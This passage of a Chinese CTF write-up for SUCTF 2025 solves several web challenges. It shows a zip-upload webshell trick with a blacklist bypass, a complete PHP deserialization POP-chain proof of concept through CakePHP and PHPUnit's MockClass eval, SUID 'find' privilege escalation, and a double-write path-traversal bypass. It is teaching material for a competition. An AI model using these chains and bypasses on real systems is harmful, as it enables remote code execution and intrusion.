class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-comment">// echo &quot;Unsupported file extension&quot;;</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_rename</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$fileName</span>)) &#123;<br>            <span class="hljs-comment">// echo &quot;File rename failed&quot;;</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_file</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$basePath</span>)) &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-comment">// echo &quot;Fail to move file&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;move_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-variable">$uploadDir</span> = DIR . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;upload/suimages/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;<br>    <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$zipname</span> = <span class="hljs-variable">$uploadedFile</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$uploadDir</span>;<br><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-variable">$zipname</span>, <span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html?status=success&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html?status=<span class="hljs-subst">$result</span>&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html?status=file_error&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>由于他是先解压再检验移动，只要上传一个文件名超极长的zip，或者把zip的名字写成乱码，他解压就会炸掉。文件就直接保存到upload&#x2F;suimages&#x2F;了。此时我们就可以访问我们的马来rce。</p><p>然后只需要绕一下黑名单，这个很简单，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;php&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;info&quot;</span>;<br><span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>();<br></code></pre></td></tr></table></figure><p><img src="/img/SUCTF2025/44962977-5241-499e-ac40-f209ef3b6748.png" alt="44962977-5241-499e-ac40-f209ef3b6748"></p><p><code>SUCTF&#123;sti1l_w0t3r_Run_d@@p!!!&#125;</code></p><h1 id="SU-POP"><a href="#SU-POP" class="headerlink" title="SU_POP"></a>SU_POP</h1><p>反序列化点在routes.php找的到</p><p><img src="/img/SUCTF2025/ccc3a87f-487f-471f-be96-32b21ee0a1e8.png" alt="ccc3a87f-487f-471f-be96-32b21ee0a1e8"></p><p><img src="/img/SUCTF2025/28230e20-3d6d-49ef-a67e-ea7f4064a724.png" alt="28230e20-3d6d-49ef-a67e-ea7f4064a724"></p><p>&#x2F;ser?ser&#x3D;base64的序列化链子。</p><p>php反序列化的入口一般是先找<code>__destruct()</code>，所以先全局搜，然后找可以用的<code>__destruct()</code>。</p><p>在src\vendor\react\promise\src\Internal\RejectedPromise.php中</p><p><img src="/img/SUCTF2025/48040f10-4f70-4190-a767-4212ec62897b.png" alt="48040f10-4f70-4190-a767-4212ec62897b"></p><p><img src="/img/SUCTF2025/50a9fb44-f3f8-42aa-8fb4-705187835ef1.png" alt="50a9fb44-f3f8-42aa-8fb4-705187835ef1"></p><p>reason和handler属性可控，红框圈起来的地方可以调到<code>__toString</code>，再找找<code>__tostring</code>。</p><p>src\vendor\cakephp\cakephp\src\Http\Response.php里，</p><p><img src="/img/SUCTF2025/8d1f896f-6018-4ebd-9321-907d8600b5fa.png" alt="8d1f896f-6018-4ebd-9321-907d8600b5fa"><img src="/img/SUCTF2025/d18d5a15-cbe3-43a0-a3ad-fdac1c8601bf.png" alt="d18d5a15-cbe3-43a0-a3ad-fdac1c8601bf"></p><p>这里stream属性可控，就能调到任意类的<code>__call</code>方法。</p><p>src&#x2F;vendor&#x2F;cakephp&#x2F;cakephp&#x2F;src&#x2F;ORM&#x2F;Table.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span></span>): <span class="hljs-title">mixed</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;_behaviors-&gt;<span class="hljs-title function_ invoke__">hasMethod</span>(<span class="hljs-variable">$method</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;_behaviors-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^find(?:\w+)?By/&#x27;</span>, <span class="hljs-variable">$method</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_dynamicFinder</span>(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">BadMethodCallException</span>(<br>        <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;Unknown method `%s` called on `%s`&#x27;</span>, <span class="hljs-variable">$method</span>, <span class="hljs-built_in">static</span>::<span class="hljs-variable language_">class</span>),<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/SUCTF2025/e24f557f-6f04-426f-86e6-b4a97c7bcc5d.png" alt="e24f557f-6f04-426f-86e6-b4a97c7bcc5d"></p><p>这里method可控，hasMethod方法可以返回true，同样的has方法也可以，那就可以进到：</p><p><img src="/img/SUCTF2025/febf335e-018e-4c72-9b50-66e2345b9f35.png" alt="febf335e-018e-4c72-9b50-66e2345b9f35"></p><p>这里behavior和callMethod都可控，只是参数不可控，没关系，我们上面调用的<code>__call</code>也正是无参的。那现在可以调用任意类的任意方法了。<strong>我们需要找能rce的地方，并且那个地方不需要参数或者参数跟那个函数需要的形参无关。</strong></p><p>src\vendor\phpunit\phpunit\src\Framework\MockObject\Generator\MockClass.php</p><p>generate这个函数里有eval，而且与传入的参数args无关，里面classCode和mockName的内容可控。</p><p><img src="/img/SUCTF2025/d096f109-f0c4-4e98-8073-4fffafdfb13b.png" alt="d096f109-f0c4-4e98-8073-4fffafdfb13b"></p><p><img src="/img/SUCTF2025/a4747416-25a4-4313-8cf0-4b54f5237ffe.png" alt="a4747416-25a4-4313-8cf0-4b54f5237ffe"></p><p>所以链子就形成了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">RejectedPromise</span>::<span class="hljs-title function_ invoke__">__destruct</span>()-&gt;<span class="hljs-title class_">Response</span>::<span class="hljs-title function_ invoke__">__toString</span>()-&gt;<span class="hljs-title class_">Table</span>::<span class="hljs-title function_ invoke__">__call</span>()-&gt;<span class="hljs-title class_">BehaviorRegistry</span>::<span class="hljs-title function_ invoke__">call</span>()-&gt;<span class="hljs-title class_">MockClass</span>::-&gt;<span class="hljs-title function_ invoke__">generate</span>()<br></code></pre></td></tr></table></figure><p>链子构造细节这里不多赘述</p><p>构造poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">React</span>\<span class="hljs-title class_">Promise</span>\<span class="hljs-title class_">Internal</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Cake</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Response</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RejectedPromise</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$reason</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$handled</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;reason = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Cake</span>\<span class="hljs-title class_">Http</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Cake</span>\<span class="hljs-title">ORM</span>\<span class="hljs-title">Table</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Response</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$stream</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;stream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Cake</span>\<span class="hljs-title class_">ORM</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Generator</span>\<span class="hljs-title">MockClass</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Table</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> BehaviorRegistry <span class="hljs-variable">$_behaviors</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_behaviors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BehaviorRegistry</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectRegistry</span></span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BehaviorRegistry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectRegistry</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_methodMap</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_loaded</span> = [];<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_methodMap = [<span class="hljs-string">&quot;rewind&quot;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;generate&quot;</span>)];<br>        <span class="hljs-variable language_">$this</span>-&gt;_loaded = [<span class="hljs-string">&quot;aaa&quot;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">MockClass</span>()];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PHPUnit</span>\<span class="hljs-title class_">Framework</span>\<span class="hljs-title class_">MockObject</span>\<span class="hljs-title class_">Generator</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">call_user_func</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">class_exists</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MockClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$mockName</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$classCode</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mockName = <span class="hljs-string">&quot;aaa&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;classCode = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">React</span>\<span class="hljs-title class_">Promise</span>\<span class="hljs-title class_">Internal</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RejectedPromise</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>发现要提权，找suid权限的命令：</p><p><img src="/img/SUCTF2025/8960b760-8647-49a2-a22a-5c8a904a1943.png" alt="8960b760-8647-49a2-a22a-5c8a904a1943"></p><p>find提权。<code>system(&#39;find / -name flag.txt -exec cat &#123;&#125; \;&#39;);</code></p><p><img src="/img/SUCTF2025/5530d29c-c98e-4a3b-881a-4f5fffa26523.png" alt="8960b760-8647-49a2-a22a-5c8a904a1943"></p><h1 id="SU-blog"><a href="#SU-blog" class="headerlink" title="SU_blog"></a>SU_blog</h1><p>先注册：admin&#x2F;123465</p><p>然后登录。</p><p>在文章页面可以读取文章，file很明显可以读文件，这里的参数内容必须要以articles开头，所以要目录穿越，而<code>../</code>被置空(articles&#x2F;..&#x2F;text1.txt是原来的内容)，所以可以双写绕过，拿源码。</p><p>读文件没读到flag，应该是要rce</p><p><img src="/img/SUCTF2025/6e6e9f36-4226-4043-8fe8-5e36cf78262b.png" alt="6e6e9f36-4226-4043-8fe8-5e36cf78262b"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time,os,json,hashlib<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> set_<br><span class="hljs-keyword">from</span> waf <span class="hljs-keyword">import</span> pwaf,cwaf<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = hashlib.md5(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time())).encode()).hexdigest()<br><br>users = &#123;<span class="hljs-string">&quot;testuser&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>&#125;<br>BASE_DIR = <span class="hljs-string">&#x27;/var/www/html/myblog/app&#x27;</span><br><br>articles = &#123;<br>    <span class="hljs-number">1</span>: <span class="hljs-string">&quot;articles/article1.txt&quot;</span>,<br>    <span class="hljs-number">2</span>: <span class="hljs-string">&quot;articles/article2.txt&quot;</span>,<br>    <span class="hljs-number">3</span>: <span class="hljs-string">&quot;articles/article3.txt&quot;</span><br>&#125;<br><br>friend_links = [<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;bkf1sh&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://ctf.org.cn/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;fushuling&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://fushuling.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;yulate&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://www.yulate.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;zimablue&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://www.zimablue.life/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;baozongwi&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://baozongwi.xyz/&quot;</span>&#125;,<br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>user_data = User()<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog.html&#x27;</span>, articles=articles, friend_links=friend_links)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username] == password:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">403</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        users[username] = password<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change_password&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_password</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        old_password = request.form[<span class="hljs-string">&#x27;old_password&#x27;</span>]<br>        new_password = request.form[<span class="hljs-string">&#x27;new_password&#x27;</span>]<br>        confirm_password = request.form[<span class="hljs-string">&#x27;confirm_password&#x27;</span>]<br><br>        <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&#x27;username&#x27;</span>]] != old_password:<br>            flash(<span class="hljs-string">&quot;Old password is incorrect&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">elif</span> new_password != confirm_password:<br>            flash(<span class="hljs-string">&quot;New passwords do not match&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[session[<span class="hljs-string">&#x27;username&#x27;</span>]] = new_password<br>            flash(<span class="hljs-string">&quot;Password changed successfully&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change_password.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/friendlinks&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">friendlinks</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span 